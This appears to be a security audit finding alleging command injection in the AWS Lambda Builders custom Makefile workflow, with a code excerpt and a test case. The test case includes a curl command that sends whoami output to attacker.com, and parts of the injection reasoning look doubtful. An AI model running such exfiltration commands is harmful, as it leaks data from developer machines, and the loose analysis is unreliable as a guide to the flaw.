## Vulnerability List

- Vulnerability Name: Command Injection in Custom Makefile Workflow
- Description:
  1. An attacker compromises the source code repository of a Lambda function project.
  2. The attacker modifies the `Makefile` within the project, injecting malicious commands into a build target, specifically targets like `build-{Function_Logical_Id}`.
  3. A developer uses Lambda Builders to build the Lambda function, either directly or via `sam build`.
  4. Lambda Builders, when processing the custom workflow, executes the user-supplied `Makefile` using `make`.
  5. The injected malicious commands within the `Makefile` are executed by the `make` process on the developer's machine or build environment.
- Impact:
  - **High**: Arbitrary command execution on the developer's machine or build environment. This could lead to sensitive data exfiltration, installation of malware, or further compromise of the developer's system and potentially their AWS credentials.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
  - **None**: The code directly executes the `Makefile` without any input sanitization or command filtering.
- Missing Mitigations:
  - **Input Sanitization**: Implement sanitization of the `build_logical_id` and other inputs passed to the `Makefile` execution to prevent injection of malicious commands.
  - **Command Filtering/Sandboxing**: Restrict the commands that can be executed within the Makefile. Ideally, use a safer build mechanism instead of directly executing Makefiles provided by users.
  - **Warning to Users**: Display a clear warning to users about the security risks of using custom Makefiles and the importance of reviewing Makefiles from untrusted sources.
- Preconditions:
  - Attacker has compromised the source code repository of a Lambda function project and can modify the `Makefile`.
  - Developer uses Lambda Builders to build the compromised Lambda function project with the custom Makefile workflow.
- Source Code Analysis:
  ```python
  File: /code/aws_lambda_builders/workflows/custom_make/actions.py

  class CustomMakeAction(BaseAction):
      ...
      def execute(self):
          ...
          try:
              current_env = self.osutils.environ()
              current_env.update({"ARTIFACTS_DIR": self.artifact_dir_path})
              # Export environmental variables that might be needed by other binaries used
              # within the Makefile and also specify the makefile to be used as well.
              self.subprocess_make.run(
                  [
                      "--makefile",
                      "{}".format(self.manifest_path),
                      "build-{logical_id}".format(logical_id=self.build_logical_id), # Vulnerability: build_logical_id is directly injected into make target
                  ],
                  env=current_env,
                  cwd=self.working_directory,
              )
          except MakeExecutionError as ex:
              raise ActionFailedError(str(ex))
  ```
  The `CustomMakeAction.execute` method in `aws_lambda_builders/workflows/custom_make/actions.py` directly constructs the `make` command by embedding the `build_logical_id` into the target name without any sanitization. An attacker can control the `build_logical_id` through the `options` parameter, which is derived from user input (e.g., SAM template). By crafting a malicious `build_logical_id`, an attacker can inject arbitrary `make` commands.
- Security Test Case:
  1. Create a Lambda function project with a `provided` runtime.
  2. Create a `Makefile` in the project root with the following content:
     ```makefile
     build-HelloWorldFunction:
         touch $(ARTIFACTS_DIR)/marker.txt
         malicious_command # Injected command
     ```
  3. Replace `malicious_command` with a command to execute, for example: `curl http://attacker.com/exfiltrate?data=$(whoami)`.
  4. Run `sam build --function-name HelloWorldFunction --template template.yaml` (or equivalent command that uses Lambda Builders and triggers the custom workflow).
  5. Observe if the `malicious_command` is executed. In this example, check network traffic to `attacker.com` or if the `marker.txt` file is created in the artifacts directory, indicating the Makefile was executed with injected commands.